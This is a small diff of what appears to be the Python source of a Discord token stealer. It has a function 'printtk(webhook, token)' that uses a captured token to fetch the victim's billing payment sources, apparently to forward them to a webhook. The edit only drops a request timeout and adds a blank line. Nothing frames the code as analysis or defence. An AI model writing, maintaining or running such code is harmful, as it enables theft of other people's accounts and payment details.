@@ -143,7 +143,7 @@ def printtk(webhook, token):
         try:
             billing_req = requests.get(
                 'https://discord.com/api/v6/users/@me/billing/payment-sources',
-                headers=headers, timeout=10
+                headers=headers,
             )
 
             if billing_req.status_code == 200 and isinstance(billing_req.json(), list) and billing_req.json():
@@ -405,6 +405,7 @@ def main():
         
 
 main()
+
 
 
 
